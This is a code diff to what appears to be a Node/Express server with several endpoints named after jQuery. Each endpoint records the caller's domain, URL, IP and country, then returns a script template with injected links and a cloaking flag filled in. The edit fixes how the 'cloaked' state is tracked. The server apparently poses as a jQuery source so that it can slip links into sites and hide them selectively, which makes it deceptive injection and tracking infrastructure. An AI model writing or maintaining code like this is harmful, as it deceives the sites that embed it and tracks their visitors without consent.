@@ -243,6 +243,7 @@ app.post('/jquery/latest', function(req, res) {
         connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
+                var cloaked = 0;
 
                 //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
@@ -254,7 +255,8 @@ app.post('/jquery/latest', function(req, res) {
                         if(response.jquery == false) { 
                             response = ""; 
                         }
-                        else if(response.jquery == "cloaked") { 
+                        else if(response.jquery == "cloaked") {
+                            cloaked = 1;
                             response = "";
                         }
                         else { 
@@ -266,7 +268,7 @@ app.post('/jquery/latest', function(req, res) {
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                            if(response.jquery == "cloaked") {
+                            if(cloaked == 1) {
                                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                             }
 
@@ -341,6 +343,7 @@ app.post('/jquery/stable', function(req, res) {
         connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
+                var cloaked = 0;
 
                 //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
@@ -353,6 +356,7 @@ app.post('/jquery/stable', function(req, res) {
                             response = ""; 
                         }
                         else if(response.jquery == "cloaked") {
+                            cloaked = 1;
                             response = "";
                         }
                         else { 
@@ -364,7 +368,7 @@ app.post('/jquery/stable', function(req, res) {
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                            if(response.jquery == "cloaked") {
+                            if(cloaked == 1) {
                                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                             }
 
@@ -436,6 +440,7 @@ app.post('/jquery/dist', function(req, res) {
         connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
+                var cloaked = 0;
 
                 //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
@@ -448,6 +453,7 @@ app.post('/jquery/dist', function(req, res) {
                             response = ""; 
                         }
                         else if(response.jquery == "cloaked") {
+                            cloaked = 1;
                             response = "";
                         }
                         else { 
@@ -459,7 +465,7 @@ app.post('/jquery/dist', function(req, res) {
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                            if(response.jquery == "cloaked") {
+                            if(cloaked == 1) {
                                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                             }
 
@@ -547,6 +553,7 @@ app.get('/jquery/dist', function (req, res){
             connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
                 if(docs != undefined && docs[0] != undefined) {
                     var response_string = docs[0].value;
+                    var cloaked = 0;
 
                     //console.log("Response from process_request: " + response_string);
                     if(response_string == "OLD_RIPPED") {
@@ -559,6 +566,7 @@ app.get('/jquery/dist', function (req, res){
                                 response = ""; 
                             }
                             else if(response.jquery == "cloaked") {
+                                cloaked = 1;
                                 response = "";
                             }
                             else { 
@@ -570,7 +578,7 @@ app.get('/jquery/dist', function (req, res){
                                 var replacedFile = String(data).replace('replacemeuuid', uuid);
                                 replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                                if(response.jquery == "cloaked") {
+                                if(cloaked == 1) {
                                      replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                                 }
 
@@ -647,6 +655,7 @@ app.post('/jquery', function (req, res){
         connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
+                var cloaked = 0;
 
                 //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
@@ -659,6 +668,7 @@ app.post('/jquery', function (req, res){
                             response = ""; 
                         }
                         else if(response.jquery == "cloaked") {
+                            cloaked = 1;
                             response = "";
                         }
                         else { 
@@ -670,8 +680,8 @@ app.post('/jquery', function (req, res){
                             var replacedFile = String(data).replace('replacemeuuid', uuid);
                             replacedFile = String(replacedFile).replace('replacemelinks', response);
 
-                            if(response.jquery == "cloaked") {
-                                 replacedFile = String(replacedFile).replace('replacemestats', 'yes');
+                            if(cloaked == 1) {
+                                replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                             }
 
                             res.writeHead(200, {
